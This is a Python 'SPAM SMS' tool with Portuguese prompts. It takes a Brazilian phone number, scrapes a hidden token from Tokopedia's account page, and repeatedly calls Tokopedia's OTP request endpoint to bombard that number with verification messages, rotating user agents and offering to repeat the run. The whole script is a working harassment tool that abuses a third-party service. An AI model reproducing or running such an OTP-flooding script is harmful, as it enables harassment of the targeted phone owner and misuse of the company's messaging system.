#!/usr/bin/python
import requests, random,json,time,sys,os,re
def Main():
 BRANCO='\033[1;29m'
 VermelhoAll='\e[01;37;41m'
 NADA='\033[0m'
 CINZA='\e[02;37m'
 DESTACAR='\e[01;37m'
 RED='\033[1;31m'
 GREEN='\033[1;32m'
 YELLOW='\033[1;33m'
 SCOLOR='\033[0m'
 SEMCOR='\033[8m'
 BrancoAll='\033[03;37;47m'
 LETRAPRETA='\033[02;30;47m'

 BANNER = f"============================================{NADA}\n{LETRAPRETA}                  SPAM SMS                  {NADA}\n============================================{NADA}"

 os.system('clear')

 print(f"{BANNER}")

 nomer=str(input('DIGITE O DDD+NUMERO: '))
 print()
 print()
 print()
 print(f"{NADA}{LETRAPRETA}           SPAM INICIADO           {NADA}")


 tempo = 15
 nomero = nomer.replace(" ", "%20")
 nimero = nomer.replace(" ", "")
 numero = f"+55{nimero}"

 contagem = 0
 while contagem < 3:
  contagem = contagem + 1
  tempo = int(tempo + 15)
  userags=random.choice(open('ua.txt').readlines()).split('\n')[0]

  heads = {
   'User-Agent' : userags,
   'Accept-Encoding' : 'gzip, deflate',
   'Connection' : 'keep-alive',
   'Origin' : 'https://accounts.tokopedia.com',
   'Accept' : 'application/json, text/javascript, */*; q=0.01',
   'X-Requested-With' : 'XMLHttpRequest',
   'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
  regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=+55%20'+nomero+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = heads).text
  Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
  date = {
   "otp_type" : "116",
   "msisdn" : numero,
   "tk" : Token,
   "email" : '',
   "original_param" : "",
   "user_id" : "",
   "signature" : "",
   "number_otp_digit" : "6"
		}
  try:
   req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = heads, data = date).text
  except:
   pass
  
  if 'true' in req:
   print(f"{GREEN}Sucesso - {contagem}/3{NADA}")
   time.sleep(30)	
  else:
   print(f"{RED}Falha, Finalizando...{NADA}")
   contagem = 3
 print()
 print(f"{RED}Spam Finalizando{NADA}")
 print()
 print("1 - REPETIR SPAM")  
 print("0 - VOLTAR")
 print()
 option = input("ESCOLHA UMA OPÇÃO: ")

 try:
  if option == '1':
   Main()
   
  else:
   os.system('bash force')
   
 except:
  Main()
Main()
